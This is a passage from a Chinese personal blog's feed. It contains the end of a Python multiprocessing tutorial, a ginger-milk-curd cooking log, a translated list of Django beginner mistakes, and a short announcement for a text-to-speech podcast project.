class="built_in">range</span>(<span class="built_in">len</span>(numbers)):</span><br><span class="line">            lock.acquire()</span><br><span class="line">            numbers[i] += <span class="number">1</span></span><br><span class="line">            lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建锁</span></span><br><span class="line">    lock = Lock()</span><br><span class="line">    </span><br><span class="line">    shared_number = Value(<span class="string">&#x27;i&#x27;</span>, <span class="number">0</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Value at beginning:&#x27;</span>, shared_number.value)</span><br><span class="line"></span><br><span class="line">    shared_array = Array(<span class="string">&#x27;d&#x27;</span>, [<span class="number">0.0</span>, <span class="number">100.0</span>, <span class="number">200.0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Array at beginning:&#x27;</span>, shared_array[:])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将锁传入目标函数</span></span><br><span class="line">    process1 = Process(target=add_100, args=(shared_number, lock))</span><br><span class="line">    process2 = Process(target=add_100, args=(shared_number, lock))</span><br><span class="line"></span><br><span class="line">    process3 = Process(target=add_100_array, args=(shared_array, lock))</span><br><span class="line">    process4 = Process(target=add_100_array, args=(shared_array, lock))</span><br><span class="line"></span><br><span class="line">    process1.start()</span><br><span class="line">    process2.start()</span><br><span class="line">    process3.start()</span><br><span class="line">    process4.start()</span><br><span class="line"></span><br><span class="line">    process1.join()</span><br><span class="line">    process2.join()</span><br><span class="line">    process3.join()</span><br><span class="line">    process4.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Value at end:&#x27;</span>, shared_number.value)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Array at end:&#x27;</span>, shared_array[:])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end main&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Value at beginning: <span class="number">0</span></span><br><span class="line">Array at beginning: [<span class="number">0.0</span>, <span class="number">100.0</span>, <span class="number">200.0</span>]</span><br><span class="line">Value at end: <span class="number">200</span></span><br><span class="line">Array at end: [<span class="number">200.0</span>, <span class="number">300.0</span>, <span class="number">400.0</span>]</span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3><span id="shi-yong-suo-zuo-wei-shang-xia-wen-guan-li-qi">使用锁作为上下文管理器</span></h3><p>在 <code>lock.acquire()</code> 之后，你应该永远不要忘记调用 <code>lock.release()</code> 来解锁代码。 你还可以将锁用作上下文管理器，这将安全地锁定和解锁你的代码。 建议以这种方式使用锁：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_100</span>(<span class="params">number, lock</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="keyword">with</span> lock:</span><br><span class="line">            number.value += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3><span id="zai-python-zhong-shi-yong-dui-lie">在Python中使用队列</span></h3><p>数据也可以通过队列在进程之间共享。 队列可用于多线程和多进程环境中的线程安全/进程安全数据交换和数据处理，这意味着你可以避免使用任何同步原语（例如锁）。</p><p>队列队列是遵循先进先出（FIFO）原理的线性数据结构。 一个很好的例子是排队等候的客户队列，其中首先服务的是第一位的客户。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建队列</span></span><br><span class="line">q = Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加元素</span></span><br><span class="line">q.put(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">q.put(<span class="number">2</span>) <span class="comment"># 2 1</span></span><br><span class="line">q.put(<span class="number">3</span>) <span class="comment"># 3 2 1 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在 q 看起来是这样的:</span></span><br><span class="line"><span class="comment"># back --&gt; 3 2 1 --&gt; front</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取和移除第一个元素</span></span><br><span class="line">first = q.get() <span class="comment"># --&gt; 1</span></span><br><span class="line"><span class="built_in">print</span>(first) </span><br><span class="line"></span><br><span class="line"><span class="comment"># q 现在看起来是这样的:</span></span><br><span class="line"><span class="comment"># back --&gt; 3 2 --&gt; front</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h3><span id="zai-duo-jin-cheng-zhong-shi-yong-dui-lie">在多进程中使用队列</span></h3><p>带有队列的操作是进程安全的。 除了 <code>task_done()</code> 和 <code>join()</code> 之外，多进程队列实现了 <code>queue.Queue</code> 的所有方法。 重要方法是：</p><ul><li><code>q.get()</code>：删除并返回第一项。 默认情况下，它会阻塞，直到该项可用为止。</li><li><code>q.put(item)</code>：将元素放在队列的末尾。 默认情况下，它会阻塞，直到有空闲插槽可用为止。</li><li><code>q.empty()</code>：如果队列为空，则返回True。</li><li><code>q.close()</code>：指示当前进程不会再将更多数据放入此队列。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用多进程队列在进程之间进行通信</span></span><br><span class="line"><span class="comment"># 队列是线程和进程安全的</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">numbers, queue</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> numbers:</span><br><span class="line">        queue.put(i*i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_negative</span>(<span class="params">numbers, queue</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> numbers:</span><br><span class="line">        queue.put(i*-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    numbers = <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">    q = Queue()</span><br><span class="line"></span><br><span class="line">    p1 = Process(target=square, args=(numbers,q))</span><br><span class="line">    p2 = Process(target=make_negative, args=(numbers,q))</span><br><span class="line"></span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line"></span><br><span class="line">    p1.join()</span><br><span class="line">    p2.join()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 顺序可能不是按序列的</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        <span class="built_in">print</span>(q.get())</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end main&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line">-<span class="number">1</span></span><br><span class="line">-<span class="number">2</span></span><br><span class="line">-<span class="number">3</span></span><br><span class="line">-<span class="number">4</span></span><br><span class="line">-<span class="number">5</span></span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3><span id="jin-cheng-chi">进程池</span></h3><p>进程池对象控制可以向其提交作业的工作进程池。它支持带有超时和回调的异步结果，并具有并行映射实现。它可以自动管理可用的处理器，并将数据拆分为较小的块，然后由不同的进程并行处理。有关所有可能的方法，请参见 <a href="https://docs.python.org/3.7/library/multiprocessing.html#multiprocessing.pool">https://docs.python.org/3.7/library/multiprocessing.html#multiprocessing.pool</a>。重要方法有</p><ul><li><code>map(func, iterable[, chunksize])</code>：此方法将 Iterable 分成许多块，作为单独的任务提交给进程池。这些块的（大约）大小可以通过将 chunksize 设置为正整数来指定。它会阻塞，直到结果准备好为止。</li><li><code>close()</code>：阻止将更多任务提交到池中。一旦完成所有任务，工作进程将退出。</li><li><code>join()</code>：等待工作进程退出。使用 <code>join()</code> 之前，必须先调用 <code>close()</code> 或 <code>terminate()</code>。</li><li><code>apply(func, args)</code>：使用参数args调用func。它会阻塞，直到结果准备好为止。 func仅在池的一个工作程序中执行。</li></ul><p>注意：也有不会阻塞的异步变体 <code>map_async()</code> 和 <code>apply_async()</code>。结果准备好后，他们可以执行回调。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cube</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="keyword">return</span> number * number * number</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numbers = <span class="built_in">range</span>(<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    p = Pool()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 默认情况下，这将分配此任务的最大可用处理器数 --&gt; os.cpu_count()</span></span><br><span class="line">    result = p.<span class="built_in">map</span>(cube,  numbers)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># or </span></span><br><span class="line">    <span class="comment"># result = [p.apply(cube, args=(i,)) for i in numbers]</span></span><br><span class="line">    </span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">27</span>, <span class="number">64</span>, <span class="number">125</span>, <span class="number">216</span>, <span class="number">343</span>, <span class="number">512</span>, <span class="number">729</span>]</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      17. 多进程 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>姜汁撞奶小记</title>
    <link href="https://qiwihui.com/qiwihui-blog-72/"/>
    <id>https://qiwihui.com/qiwihui-blog-72/</id>
    <published>2022-08-13T01:54:25.500Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>上周陪着看《向往的生活》，黄磊在节目中给大家做了一次姜汁撞奶，看着大家都吃得都开了花似的，于是决定我也要做一次。</p><h2><span id="1-0-ban-ben">1.0版本</span></h2><p>在超市买菜的时候随手买了生姜和牛奶，回到家放进冰箱也就忘了。昨天想起来开始做时已经过了五天了，开始第一次尝试。首先把生姜切成小块，放碗里用擀面杖捣碎了，因为生姜有点干了，加了点水挤出来小半碗姜汁，然后把牛奶加入白糖煮开了，倒入装姜汁的碗中，然后将碗中的撞奶放到锅上蒸了五分钟。但是，结果并没有像电视上那样好，牛奶还是牛奶，加了姜汁和糖的牛奶。为什么会失败呢？</p><p>认真分析了一下原因，我想大概是是这样的：姜汁撞奶的过程就是蛋白质变性的过程，牛奶中的蛋白质和姜汁中的某些物质混合导致蛋白质变性，和做豆腐脑的过程差不多，但是因为原料的品质没有达到变性的要求：</p><ol><li>生姜放着已经变干了，没有什么汁水，我又加了水，导致姜汁的浓度不够；</li><li>牛奶的保质期是8天，加上放置的几天，基本也就是变质前一天才用，这是蛋白质已经发生了一些变化，从我之后买的新鲜的牛奶的对比可以看出这时的牛奶已经有些变浑了，而且可能牛奶不是全脂的，蛋白质浓度不高；</li><li>姜汁和牛奶混合之后放锅上蒸其实是为了保温，但是加热沸腾会使最后变性的过程被破坏，没法凝成豆腐脑那样。</li></ol><p>基于以上的分析，我决定再试一次。</p><span id="more"></span><h2><span id="2-0-ban-ben">2.0版本</span></h2><p>首先选材，生姜选老一些的，这样是蛋白质变性的物质含量高，牛奶选全脂的，蛋白质含量高。其次，做法上，生姜用板子磨成末挤姜汁水，牛奶煮的时候煮到快开再关火等10秒，这样大概就是80度，然后与姜汁混合。混合的时候把姜汁分成了两个碗，每个碗倒入原来一般的牛奶，这样就比之前更好控制。混合之后不搅动，并用盘子盖住保持温度，等10分钟左右。</p><p>经过这些改进，我终于得到了形似豆腐脑的姜汁装奶！虽然没有把握好糖的量使得牛奶有些淡，但2.0版本味道确实不错。</p><img width="367" alt="ginger_milk" src="https://user-images.githubusercontent.com/3297411/57985140-3ab2f300-7a96-11e9-887a-a5ffed954da9.png"><h2><span id="zong-jie">总结</span></h2><p>做一件事要了解原理，掌握每一步的技术细节和对结果的影响，这样才能做好一件事！这就是两次姜汁撞奶的总结。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      姜汁撞奶小记
    
    </summary>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>学习Django──我犯的初学者错误以及如何避免</title>
    <link href="https://qiwihui.com/qiwihui-blog-81/"/>
    <id>https://qiwihui.com/qiwihui-blog-81/</id>
    <published>2022-08-13T01:54:25.500Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这篇文章是 reddit 上用户 <a href="https://www.reddit.com/user/unknownguy0518/">unknownguy0518</a> 发表的他在学习Django是所犯的初学者错误，以及他的一些建议。更多具体的内容可以前往对应的 <a href="https://www.reddit.com/r/django/comments/eld87j/learning_django_beginner_mistakes_i_made_that_you/">话题</a> 查看。</p></blockquote><p>我是 Django Web 框架的新手。我也不是专业的程序员。我没有任何人的帮助，我学到的一切都是通过反复试验而得出的。我犯了无数的错误，当我回首时，我现在笑了。在艰难学习了很多基础知识之后，我成功地创建了一个简单的网站来添加/更新/删除联系人。它已部署在 Heroku（免费服务器）中。我在这里写的内容纯属我个人观点。如果你是初学者，并且热衷于探索 Django 的世界，则应该阅读这篇文章。它可能会帮助你解决问题。</p><p>那些想浏览我的网站的人（仍然需要一些工作），它是：<a href="https://djangophonebook.herokuapp.com">https://djangophonebook.herokuapp.com</a></p><span id="more"></span><p>以下是我在创建自己的网站的过程中面临的主要挑战：</p><h3><span id="guan-fang-wen-dang-yu-jiao-cheng">官方文档与教程</span></h3><p>很多具有 Django 经验或其他编码经验的人都会告诉你阅读官方文档，以了解有关这个出色 Web 框架的更多信息。实际是，并非所有人都喜欢这么高的技术细节。乍一看，任何指定这样的框架内部工作的文档都会吓到新手。毫无疑问，Django 文档是非常详细并且组织得很好，但是我建议你观看一些出色的视频教程，使我们对所有可用功能以及如何在实际项目中实现这些功能有所了解。我亲自浏览了 YouTube上 “<a href="https://www.youtube.com/user/schafer5">Corey Schafer</a>” 的 Django 教程。这是我在互联网上找到的最好的教程之一。还有很多其他人，但我总是回头去看他的视频。我还发现 YouTube 上 “<a href="https://www.youtube.com/user/CodingEntrepreneurs">CodingEntrepreneurs</a>” 的“<a href="https://www.youtube.com/playlist?list=PLEsfXFp6DpzTD1BD1aWNxS2Ep06vIkaeW">尝试 Django</a>” 系列也是一个很好的教程。一旦有了方向感，官方文档就会变得更加有意义。</p><h3><span id="django-ban-ben">Django 版本</span></h3><p>现在有很多针对 Django 1.x 版本的教程。尽管我们的项目很想使用相同的版本，但我强烈建议你使用 Django 的最新稳定版本（译者注：翻译时是2020年1月，最新版本为是 2.2.9）。它不仅消除了重写代码，而且还使我们能够使用旧版本可能没有的新功能。</p><h3><span id="shi-yong-git-he-github">使用 Git 和 GitHub</span></h3><p>刚开始处理项目时，我忽略了使用 Git 维护版本控制。有一天，当我清除计算机中的一些旧文件夹时，我不小心删除了整个项目文件夹。这时我才意识到使用 Git 跟踪我在项目中所做的更改的重要性时。对于像我这样的新手来说，花了一段时间才弄清楚如何使用它（有时我仍在为它而苦苦挣扎），但它为我省去了很多麻烦。我还使用 GitHub 将所有代码转储为一个开源项目。你应该考虑使用 Git。如果你搞砸了并想恢复到项目的旧版本，它将对你有很大帮助。相信我，重新编写代码真的很令人沮丧。</p><h3><span id="shi-yong-gitignore-wen-jian">使用 <code>.gitignore</code> 文件</span></h3><p>如果使用的是 Git，请确保还使用 gitignore 文件。添加你不希望 Git 跟踪的所有文件或文件夹。有一个 GitHub 链接（<a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a>），我参考的是 Python.gitignore 文件，并将所有内容从该文件复制粘贴到我的 gitignore 文件中。尽管某些细节不一定特定于 Django，但我将一切保持不变。它涵盖了我的用例的所有内容。我强烈建议你以此为起点。之后，你可以根据需要修改文件。</p><h3><span id="ti-sheng-ni-de-qian-duan-ji-neng">提升你的前端技能</span></h3><p>是的，你将需要它。你将需要至少了解 HTML 的基础，才能在 Django 中创建模板。了解一点 CSS 和 JavaScript 会更好。它可以帮助进一步自定义网站的外观。对于前端，我是一个完全的菜鸟。我知道只有足够的 HTML 可以创建一个准系统模板，而对 CSS 的了解则很少，甚至不考虑自定义我的网站。幸运的是，对于像我这样的人，Bootstrap 可以为我们提供现成的小组件，可以在我的网站上使用。它简化了我的许多前端要求。我的项目完全基于 HTML 和 Bootstrap 构建。</p><h3><span id="shi-yong-xu-ni-huan-jing">使用虚拟环境</span></h3><p>为你的项目创建一个单独的虚拟环境是一个好习惯。当你准备部署项目时，这也将派上用场。我艰难地了解了它的重要性。现在，我会首先创建一个虚拟环境，安装所有必需的软件包，然后在我的项目上工作。</p><h3><span id="shi-yong-dan-du-de-settings-py-wen-jian-jin-xing-kai-fa-he-sheng-chan">使用单独的 <code>settings.py</code> 文件进行开发和生产</span></h3><p>我没有碰到太多的教程来解释为什么在开发和生产过程中使用单独的 <code>settings.py</code> 文件是个好主意。单独的文件可减少混乱，并使代码测试效率更高。当你要进行大型项目时，请记住这一点。尽管我从未实现过它，但许多专家推荐它。</p><h3><span id="chuang-jian-zi-ding-yi-yong-hu-mo-xing">创建自定义用户模型</span></h3><p>大多数教程使用内置的用户模型来存储和处理与用户相关的数据。如果你想将电子邮件ID或手机号码用作登录ID，该怎么办？如果你希望在注册时从用户那里收集自己的某些字段，例如城市，省份，性别等，该怎么办？你可以通过创建自己的自定义用户模型来做到这一点。那时你应该考虑遍历 <code>AbstractUser</code> 和 <code>AbstractBaseUser</code> 类。我通常参考两个网站── <a href="https://simpleisbetterthancomplex.com/">https://simpleisbetterthancomplex.com/</a> 和 <a href="https://wsvincent.com/">https://wsvincent.com/</a> 来实现此目的。 YouTube 上的 CodingEntrepreneurs（<a href="https://www.youtube.com/watch?v=HshbjK1vDtY">https://www.youtube.com/watch?v=HshbjK1vDtY</a>）在其视频之一中还介绍了创建自定义用户模型。我强烈建议你观看它，以了解其真正工作原理，而不仅仅是复制粘贴代码。</p><h3><span id="shi-yong-she-jiao-deng-lu">使用社交登录</span></h3><p>当今大多数网站都提供了使用多种社交登录之一（例如，使用 Google 登录，使用 Facebook 登录等）登录或注册的选项。以我的个人经验，浏览我网站的大多数用户都使用了社交登录我提供的登录选项，而不是标准的注册过程。在将其付诸实践之前，在你的项目中实现它非常有意义。 “Django-Allauth” 库是一个非常好的开始，我曾经用它来实现 Google 登录。</p><h3><span id="she-ji-mo-xing">设计模型</span></h3><p>在部署项目之前，考虑一下要存储在数据库中的数据类型始终是一个好主意。哪些字段应该是必填字段，哪些字段可以是可选字段，在用户注册时要捕获的信息，所有这些都必须事先进行仔细考虑。网站上线后，对模型进行任何更改都会证明是一件非常昂贵的事情，因为我犯了这个错误。</p><h3><span id="ji-yu-han-shu-de-shi-tu-fbv-yu-ji-yu-lei-de-shi-tu-cbv">基于函数的视图（FBV）与基于类的视图（CBV）</span></h3><p>对于像我们这样的初学者来说，这始终是一个难题。根据我的经验，我发现基于通用类的视图非常容易编写，所用的代码行数少得多，并且使事情看起来更加整洁。这是我们真正可以看到所有魔术发生的地方，因为 Django 在后端为我们完成了所有繁重的工作。但是，我还发现，使用 CBV 实现任何自定义逻辑不是非常用户友好。我在互联网上也找不到太多有关如何使用和覆盖现有 CBV 方法的资料。这正是基于函数的视图蓬勃发展的地方。它们需要编写更多的代码行，解释起来可能会更复杂，但是当我们必须实现任何自定义逻辑时，它们就可能会显得很强大。了解 CBV 和 FBV 的工作原理确实有帮助。但是对于大多数用例来说，CBV 可以轻松完成工作。这是我创建视图时的首选路径。</p><h3><span id="lu-you-he-url">路由和 URL</span></h3><p>除了设计模型之外，在创建项目时规划所有路由也很有意义。清楚了解各种 URL 还可简化编写其相应视图的过程。很重要的一点是我们要确保各个应用程序之间的 URL 保持一致并准备进行 CRUD 操作。当编写 REST API 入口时，它也使事情变得更容易。</p><h3><span id="zai-sheng-chan-huan-jing-zhong-chu-li-jing-tai-wen-jian-he-mei-ti-wen-jian">在生产环境中处理静态文件和媒体文件</span></h3><p>很少有教程可以告诉你在尝试部署项目时将面临的一些挑战。我试图在 Heroku 上部署我的应用。当你设置 <code>DEBUG = False</code> 时，默认情况下 Django 不支持提供静态文件和媒体文件。对于静态文件，WhiteNoise 库为我完成了这项工作。它的文档也很简单。 Heroku 不存储媒体文件。我们必须使用其他服务，例如 Amazon 的 S3，并使用所有必需的参数相应地更新 <code>settings.py</code> 文件。 S3也可以用于提供静态文件，但主要缺点是它不是免费的。结果，我的网站当前无法加载用户选择的任何个人资料图片。我尚未找到替代方法。预先规划好你要如何提供媒体文件，并考虑到所涉及的成本。</p><h3><span id="chu-li-bu-tong-yong-hu-de-quan-xian">处理不同用户的权限</span></h3><p>这是要考虑的重要点。我面临的挑战之一是弄清楚如何为不同的用户授予或限制对特定 URL 的访问。例如，基于某些条件，用户 A 可能具有对 URL 的只读访问权限，而用户 B 可能具有对同一 URL 的写访问权限。你不希望一个用户访问另一个用户配置文件并对其进行更新。那是你需要确保为访问的 URL 授予适当权限的地方。<a href="https://www.youtube.com/user/schafer5">Corey Schafer</a> 的教程对此进行了很好的介绍。</p><h3><span id="chuang-jian-zi-ding-yi-zhong-jian-jian">创建自定义中间件</span></h3><p>涉及该主题的教程并不多。我还没有弄清楚如何创建自己的中间件。当我有更多信息时，我将更新此部分。</p><h3><span id="gai-shan-wang-zhan-de-an-quan-xing">改善网站的安全性</span></h3><p>我还没有看到太多的教程来解释 <code>python manage.py check -–deploy</code>，以及为什么它对确保我们在网站上线之前具有必要的安全性很重要。在启用网站之前，你应该探索一些东西。网站的安全性和用户数据的安全性必须受到重视。</p><h3><span id="bao-hu-ni-de-guan-li-jie-mian">保护你的管理界面</span></h3><p>我喜欢 Django 的原因之一是因为它内置了许多安全功能。其中之一就是功能齐全的管理界面。用户访问管理页面后，他/她实际上就可以滥用数据。创建超级用户时，请确保不要使用诸如 <code>admin</code> 或 <code>manager</code> 之类的通用名称作为登录ID。另外，请确保使用很难猜到的非常强的密码。另外，将管理页面的路径更改为完全不同且难以确定的名称。避免使用默认的 <code>admin/</code> 路径。我还遇到了一个名为 <code>django-admin-honeypot</code> 的第三方库，该库通过创建类似管理员的页面来欺骗未经授权的用户，但没有执行其他任何操作。此外，它还在表中捕获了这些用户的详细信息，例如其 IP 地址和其他参数，这些表可以在实际的 Admin 界面中访问。然后，你可以决定是否要阻止他们访问你的网站或采取必要的措施。</p><h3><span id="bao-hu-mi-mi-mi-yao-he-qi-ta-guan-jian-shu-ju">保护秘密密钥和其他关键数据</span></h3><p>使你的项目成为开放源代码的挑战之一就是要保护 <code>SECRET KEY</code> 和其他个人价值，例如你不希望世界其他地方看到的电子邮件ID和密码。我遵循 <a href="https://www.youtube.com/user/schafer5">Corey Schafer</a> 在他的 YouTube 视频中提供的建议，并将所有这些重要值保存为环境变量。万一你有意或无意间发现你的秘密密钥，必须立即进行更改。你可以使用 python 自带的 <code>secrets</code> 模块（需要 Python 3.6+）来生成强密钥。同样，<a href="https://www.youtube.com/user/schafer5">Corey Schafer</a> 的教程也涵盖了这一部分。</p><h3><span id="da-zao-xiang-ying-shi-wang-zhan">打造响应式网站</span></h3><p>很少有教程着重介绍使桌面和移动设备友好的网站。最初创建网站时，它在PC上可以正常显示，但是当我尝试在移动设备上访问它时，我意识到必须重做一些模板。在创建模板时立即考虑到这一点，以后可以节省大量的工作量。我主要使用B ootstrap 作为前端，它着重于创建移动优先项目。</p><h3><span id="bian-xie-ce-shi">编写测试</span></h3><p>每个应用程序都会创建一个 <code>tests.py</code> 文件。我仍然不知道如何编写测试。我观察到，GitHub上 可用于 Python 或 Django 的许多软件包或库确实进行了大量测试。同样，很少有教程解释如何编写测试。这是我仍在尝试解决的问题。当我有更多信息时，我将更新此部分。</p><h3><span id="shi-yong-rest-api">使用 REST API</span></h3><p>尽管 REST API 本身并不是一个单独的话题，但像我们这样的初学者应该知道，为什么对其进行计划很重要，如何创建 API 以及如何将其与 Angular 或 React 等其他前端集成。以我的经验，在设计视图时同时编写 REST API 确实可以使事情更高效，并且省去了尝试弄清楚权限和其他方面的麻烦。“ Django Rest Framework” 是 REST API 的首选库。我通常会创建一个单独的名为 “api” 的应用，并在此处编写所有其他应用的序列化器和视图。它将所有内容都放在一个地方。尽管我的项目有 API 入口，但我仍然必须创建一些 API。</p><h3><span id="zai-bu-shu-zhi-qian-she-zhi-debug-false">在部署之前设置 <code>DEBUG = False</code></span></h3><p>在部署期间保留 <code>DEBUG = True</code> 是常见错误，我也犯了。在启用网站之前，请不要忘记在 <code>settings.py</code> 文件中将 <code>DEBUG</code> 值设置为 <code>False</code>。你不希望最终用户在URL引发错误时看到所有异常和其他与编码有关的信息。 <a href="https://www.youtube.com/user/schafer5">Corey Schafer</a> 很好地解释了如何在他的教程中进行处理。</p><h3><span id="bu-shu-xiang-mu">部署项目</span></h3><p>对于像我这样的初学者来说，这是另一个真正的麻烦。我应该在哪里部署我的项目（Heroku，PythonAnywhere，DigitalOcean，AWS等）？我应该做什么准备工作？我在生产中使用哪个数据库？我需要什么所有文件来开始部署（例如 requirements.txt，procfile 等）？我应该去免费服务器还是付费服务器？很多事情要考虑。我浏览了 <a href="https://www.youtube.com/user/schafer5">Corey Schafer</a> 在 YouTube 上的视频，最终将其部署在免费的 Heroku 服务器上。</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      学习Django──我犯的初学者错误以及如何避免
    
    </summary>
    
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>项目：文章转博客 Podcastx</title>
    <link href="https://qiwihui.com/qiwihui-blog-115/"/>
    <id>https://qiwihui.com/qiwihui-blog-115/</id>
    <published>2022-08-13T01:54:25.490Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>这个项目是对之前使用谷歌文章转语音（TTS）功能后的一个实验性产品，项目目前的功能是将博客文章转成语音进行收听。</p><p>项目地址： <a href="https://podcastx.qiwihui.com">https://podcastx.qiwihui.com</a></p><p>目前支持的功能：</p><ol><li>输入文章链接，生成对应文章的语音朗读，目前中文。</li><li>提供内嵌播放器放入博客中，使博客可以朗读。</li><li>支持对已生成的播客进行搜索和收藏。</li></ol><p>待支持的功能：</p><ol><li>同时支持多种语言，支持不用声音朗读。</li><li>支持 RSS 订阅朗读。</li><li>支持评论。</li><li>支持浏览器插件。</li></ol><span id="more"></span><p>这个项目的下一个阶段的功能，是提供从文字到播客的功能，目的在于为设备或者口语能力有限的人提供制作博客的方便方法。看到很多技术达人在制作播客，作者本人也想制作一些博客，碍于口语表达。所以这个项目的目的就在于将这个过程通过比较成熟的tts来实现。</p><p>项目UI：</p><p><img src="https://user-images.githubusercontent.com/3297411/108465572-3ea02480-72bd-11eb-9847-7d884b1c8898.png" alt="podcastx"></p><p><img src="https://user-images.githubusercontent.com/3297411/108466753-203b2880-72bf-11eb-817c-b1ae7ec89118.png" alt="play list"></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      项目：文章转博客 Podcastx
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
      <category term="机器学习" scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="深度学习" scheme="https://qiwihui.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>04. 集合 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-121/"/>
    <id>https://qiwihui.com/qiwihui-blog-121/</id>
    <published>2022-08-13T01:54:25.490Z</published>
